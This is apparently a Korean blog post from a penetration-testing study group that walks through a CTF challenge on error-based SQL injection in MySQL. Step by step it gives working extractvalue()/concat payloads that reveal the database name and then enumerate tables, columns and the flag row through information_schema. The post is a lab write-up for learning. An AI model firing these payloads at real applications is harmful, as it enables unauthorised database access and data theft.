---
layout: post
comments: true
sitemap:
    changefreq:
    priority:

title: "[CTF] CTF 문제 풀이: Error Based SQL Injection"
excerpt: "모의해킹 취업반 스터디 7기 7주차"

date: 2024-11-28
last_modified_at: 

categories: [CTF]
tags: [TIL, WEB]
---

# 회고
* Error-Based SQL Injection은 SQL의 Error 문구를 이용하여 데이터를 추출하는 공격 방식이다.
* 데이터베이스 종류마다 공격 방식이 다르다.
* MySQL에서는 공격 방식이 크게 두 가지가 있는데, 그 중 하나가 XPath를 이용한 공격이다.
    extractvalue()함수를 이용한다.
  
**[이론 설명 포스트](/Error_Based_SQL_Injection)**

# Error Based SQL Injection
## START
1. **normaltic**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-1.png?raw=true)
1. **normaltic'**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-2.png?raw=true)
1. **normaltic' and extractvalue('1', (concat(0x3a, 'test'))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-3.png?raw=true)

## DATABASE
1. **normaltic' and extractvalue('1', (concat(0x3a, database()))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-4.png?raw=true)
-> 💡 DB의 이름이 errSqli라는 것을 알았다

## TABLE
1. **normaltic' and extractvalue('1', (concat(0x3a, select table_name from information_schema.tables where table_schema = 'errSqli' limit 0, 1))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-29-1.png?raw=true)
-> 👀 문법 오류가 발생했다.  
-> 🙄 문법 오류가 왜 발생한 건지 잘 모르겠다.  

1. **normaltic' and extractvalue('1', (concat(0x3a, select database()))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-29-2.png?raw=true)
-> 👀 문법 오류가 발생했다.  
-> 👀 [위쪽](#database)에서는 SELECT를 안 쓰고 DATABASE()만 썼더니 나왔다.  
-> 🤔 SELECT를 쓸 때는 괄호를 한 번 더 감싸줘야 하는걸까?  

1. **normaltic' and extractvalue('1', (concat(0x3a, (select database())))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-4.png?raw=true)
-> 💡 괄호로 SELECT문을 한 번 더 감싸줬더니 결과가 나왔다.  
-> 🤔 TABLE 이름 가져오는 것도 마찬가지고 괄호로 한 번 감싸면 될 것 같다.  

1. **normaltic' and extractvalue('1', (concat(0x3a, (select table_name from information_schema.tables where table_schema = 'errSqli' limit 0, 1)))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-5.png?raw=true)
-> 💡 첫 번째 TABLE 이름이 flagTable이라고 한다.  
-> 🤔 혹시 다른 TABLE이 더 있을까?  

1. **normaltic' and extractvalue('1', (concat(0x3a, (select count(table_name) from information_schema.tables where table_schema = 'errSqli')))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-6.png?raw=true)
-> 💡 TABLE 개수가 3개라고 한다.  

1. **normaltic' and extractvalue('1', (concat(0x3a, (select table_name from information_schema.tables where table_schema = 'errSqli' limit 1, 1)))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-7.png?raw=true)
-> 💡 두 번째 TABLE 이름은 member였다.  

1. **normaltic' and extractvalue('1', (concat(0x3a, (select table_name from information_schema.tables where table_schema = 'errSqli' limit 2, 1)))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-8.png?raw=true)
-> 💡 두 번째 TABLE 이름은 plusFlag_Table였다.  
-> 🤔 flagTable 먼저 확인하고 안 되면 plusFlag_Table 확인하면 될 것 같다.  

## COLUMN
💡 이제부터는 개수 먼저 확인해야겠다.  
1. **normaltic' and extractvalue('1', (concat(0x3a, (select count(column_name) from information_schema.columns where table_name = 'flagTable')))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-9.png?raw=true)
-> 💡 flagTable의 컬럼 개수는 2개라고 한다.  
-> 💡 하나씩 컬럼 이름을 확인해보겠다.  

1. **normaltic' and extractvalue('1', (concat(0x3a, (select column_name from information_schema.columns where table_name = 'flagTable' limit 0, 1)))) **#
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-10.png?raw=true)
-> 💡 첫 번째는 idx였다.  

1. **normaltic' and extractvalue('1', (concat(0x3a, (select column_name from information_schema.columns where table_name = 'flagTable' limit 1, 1)))) **#
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-11.png?raw=true)
-> 💡 두 번째는 flag였다.  

## DATA
💡 마찬가지로 개수 먼저 확인했다.  
1. **normaltic' and extractvalue('1', (concat(0x3a, (select count(flag) from flagTable)))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-12.png?raw=true)
-> 💡 데이터는 총 1개이다.  

1. **normaltic' and extractvalue('1', (concat(0x3a, (select flag from flagTable)))) #**
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-28-13.png?raw=true)
-> 😎 찾았다!  